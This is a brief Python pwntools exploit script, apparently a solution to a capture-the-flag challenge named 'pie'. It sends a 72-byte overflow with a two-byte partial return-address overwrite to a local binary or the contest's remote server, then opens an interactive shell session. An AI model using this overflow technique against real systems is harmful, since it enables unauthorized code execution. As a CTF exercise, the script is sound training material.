#!/usr/bin/env python

from pwn import *

local = 1

if local:
	r = process("./pie")
	gdb.attach(r)
else:
	r = remote("shell.actf.co", 19306)


payload = ''
payload += 'A'*72
payload += '\xa9\x61'

r.sendline(payload)

r.interactive()